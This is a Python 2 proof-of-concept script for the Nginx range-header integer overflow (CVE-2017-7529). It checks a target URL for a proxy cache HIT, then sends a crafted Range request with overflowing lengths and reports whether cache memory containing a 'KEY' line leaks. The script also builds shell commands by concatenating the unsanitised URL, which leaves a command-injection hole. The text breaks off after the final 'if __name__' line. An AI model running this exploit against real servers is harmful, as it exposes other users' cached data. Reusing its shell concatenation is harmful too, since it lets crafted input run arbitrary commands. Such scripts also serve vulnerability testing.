
import os
import commands
import sys
 
def poc(url):
 
	print '[*]Testing for: ' + url
 
	cmd1 = 'curl -I ' + url
	os.popen(cmd1)
	os.popen(cmd1)
	re1 = commands.getoutput(cmd1).split('\n')
 
	hit = False
	has_x_proxy_cache = False
	img_len = 0
 
	for i in range(0,len(re1)):
		# print re1[i]
		if 'X-Proxy-Cache' in re1[i]:
			has_x_proxy_cache = True
			if 'HIT' in re1[i]:
				hit = True
 
		if 'Content-Length' in re1[i]:
			img_len = int(re1[i].split(' ')[1])
 
	if has_x_proxy_cache:
		if hit:
			print '[*]X-Proxy-Cache is HIT.'
			print '[*]The image length: ' + str(img_len)
 
			len1 = img_len + 600
			len2 = 0x8000000000000000 - len1
 
			cmd2 = 'curl -i ' + url + ' -r -' + str(len1) + ',-' + str(len2)
			re2 = commands.getoutput(cmd2).split('\n')
 
			vul = False
			for i in range(0,len(re2)):
 
				if 'KEY' in re2[i]:
					print '[+]Nginx Int Overflow(CVE-2017-7529) exists!'
					print '[+]' + re2[i]
					vul = True
 
			if not vul:
				print '[-]Can not find the vuln.'
		else:
			print '[-]The X-Proxy-Cache is MISS.'
			print '[-]Can not find the vuln.'
	else:
		print '[-]The header without X-Proxy-Cache.'
		print '[-]Can not find the vuln.'
 
def main():
 
	if len(sys.argv) == 2:
		url = sys.argv[1]
		poc(url)
	else:
		print '[*]Usage: python nginx_int_overflow.py [URL]'
 
if __name__ == '__main__':
